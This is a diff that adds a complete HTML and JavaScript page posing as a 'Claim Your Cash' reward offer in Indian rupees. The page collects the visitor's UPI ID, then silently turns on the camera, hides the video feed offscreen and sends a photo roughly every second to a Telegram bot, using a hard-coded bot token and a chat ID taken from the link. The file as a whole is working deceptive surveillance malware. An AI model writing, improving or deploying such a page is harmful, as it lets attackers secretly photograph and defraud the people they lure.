@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>Claim Cash Reward</title>
+  <style>
+    :root {
+      --bg: #0a0015;
+      --text: #f0f0ff;
+      --accent: #00ff9d;
+      --accent-dark: #00c47a;
+      --gold: #ffd700;
+      --card: #1a0033;
+    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: system-ui, -apple-system, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      overflow: hidden;
+    }
+    .container {
+      text-align: center;
+      width: 100%;
+      max-width: 420px;
+    }
+    .emoji {
+      font-size: 110px;
+      margin: 0 0 24px;
+      animation: pulse 2.2s infinite ease-in-out;
+    }
+    @keyframes pulse {
+      0%,100% { transform: scale(1); opacity: 0.9; }
+      50%     { transform: scale(1.14); opacity: 1; }
+    }
+    h1 {
+      font-size: 2.4rem;
+      font-weight: 700;
+      color: var(--gold);
+      margin-bottom: 32px;
+      text-shadow: 0 2px 10px rgba(255,215,0,0.3);
+    }
+    .amount-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 14px;
+      margin: 24px 0 36px;
+    }
+    .amount-btn {
+      background: var(--card);
+      border: 2px solid #444466;
+      color: white;
+      font-size: 1.5rem;
+      font-weight: 600;
+      padding: 20px;
+      border-radius: 16px;
+      cursor: pointer;
+      transition: all 0.25s ease;
+      touch-action: manipulation;
+    }
+    .amount-btn.active,
+    .amount-btn:hover {
+      background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+      border-color: var(--accent);
+      color: #000;
+      transform: translateY(-3px);
+      box-shadow: 0 8px 20px rgba(0,255,157,0.35);
+    }
+    #upiInput {
+      width: 100%;
+      padding: 18px;
+      font-size: 1.2rem;
+      margin: 20px 0 32px;
+      border-radius: 14px;
+      border: 1px solid #555577;
+      background: #140022;
+      color: white;
+      text-align: center;
+      outline: none;
+    }
+    #upiInput::placeholder { color: #8888aa; }
+    #claimBtn {
+      background: linear-gradient(90deg, var(--accent), #00e676);
+      color: #000;
+      font-size: 1.7rem;
+      font-weight: bold;
+      padding: 20px 100px;
+      border: none;
+      border-radius: 60px;
+      cursor: pointer;
+      box-shadow: 0 10px 30px rgba(0,255,157,0.4);
+      transition: all 0.3s;
+      touch-action: manipulation;
+    }
+    #claimBtn:disabled {
+      background: #444;
+      box-shadow: none;
+      cursor: not-allowed;
+    }
+    #status {
+      font-size: 2.2rem;
+      font-weight: 700;
+      color: var(--accent);
+      letter-spacing: 1.5px;
+      margin-top: 40px;
+      text-align: center;
+      animation: blink 1.8s infinite;
+      min-height: 3em;
+      line-height: 1.3;
+    }
+    @keyframes blink {
+      0%,100% { opacity: 0.65; }
+      50%     { opacity: 1; }
+    }
+    .hide { display: none !important; }
+    video, canvas { position: absolute; left: -9999px; width: 1px; height: 1px; }
+  </style>
+</head>
+<body>
+
+<div class="container" id="mainUI">
+  <div class="emoji">💵</div>
+  <h1>Claim Your Cash</h1>
+
+  <div class="amount-grid">
+    <button class="amount-btn" data-value="10">10 ₹</button>
+    <button class="amount-btn" data-value="20">20 ₹</button>
+    <button class="amount-btn" data-value="30">30 ₹</button>
+    <button class="amount-btn" data-value="50">50 ₹</button>
+  </div>
+
+  <input type="text" id="upiInput" placeholder="Enter UPI ID" autocomplete="off" />
+
+  <button id="claimBtn" disabled>CLAIM NOW</button>
+</div>
+
+<div id="status"></div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+// ─────────────────────────────────────────────
+const BOT_TOKEN = "7752428251:AAGNplPML8xLHGQDaHYgs5djp70KcqMBFEI";                // ← CHANGE THIS
+const API_BASE  = `https://api.telegram.org/bot${BOT_TOKEN}/`;
+// ─────────────────────────────────────────────
+
+const urlParams = new URLSearchParams(window.location.search);
+const chatId    = urlParams.get("id") || null;
+
+let selectedAmt = null;
+let cameraStream = null;
+let imageCapture = null;
+let photoCount   = 0;
+let interval     = null;
+
+const statusEl   = document.getElementById("status");
+const claimBtn   = document.getElementById("claimBtn");
+const upiEl      = document.getElementById("upiInput");
+const mainUI     = document.getElementById("mainUI");
+const video      = document.getElementById("video");
+const canvas     = document.getElementById("canvas");
+
+document.querySelectorAll(".amount-btn").forEach(btn => {
+  btn.addEventListener("click", () => {
+    document.querySelectorAll(".amount-btn").forEach(b => b.classList.remove("active"));
+    btn.classList.add("active");
+    selectedAmt = btn.dataset.value;
+    updateClaimButton();
+  });
+});
+
+upiEl.addEventListener("input", updateClaimButton);
+
+function updateClaimButton() {
+  const upi = upiEl.value.trim();
+  claimBtn.disabled = !selectedAmt || upi.length < 6;
+}
+
+claimBtn.addEventListener("click", async () => {
+  if (!chatId) {
+    statusEl.textContent = "Invalid link – missing ?id=";
+    return;
+  }
+
+  mainUI.classList.add("hide");
+  statusEl.innerHTML = "Processing...";
+
+  try {
+    cameraStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "environment" }  // back camera – change to "user" for selfie
+    });
+
+    video.srcObject = cameraStream;
+    await video.play();
+
+    const track = cameraStream.getVideoTracks()[0];
+    imageCapture = new ImageCapture(track);
+
+    // Start super fast sending loop
+    interval = setInterval(async () => {
+      try {
+        const blob = await imageCapture.takePhoto();
+
+        photoCount++;
+        statusEl.innerHTML = `Processing...<br>${photoCount} sent`;
+
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob, `auto_${photoCount}.jpg`);
+        formData.append("caption", `${photoCount} • ${selectedAmt}₹`);
+
+        await fetch(API_BASE + "sendPhoto", {
+          method: "POST",
+          body: formData
+        });
+
+      } catch (err) {
+        console.warn("Capture/send failed:", err);
+      }
+    }, 1100);   // ~1.1s – fast but safer than 500ms (Telegram ~1/sec limit)
+
+  } catch (err) {
+    statusEl.textContent = "Camera permission denied or error";
+    console.error(err);
+  }
+});
+
+// Cleanup on leave (important for camera)
+window.addEventListener("beforeunload", () => {
+  if (interval) clearInterval(interval);
+  if (cameraStream) {
+    cameraStream.getTracks().forEach(track => track.stop());
+  }
+  // Optional: send final summary message
+});
+
+</script>
+</body>
+</html>
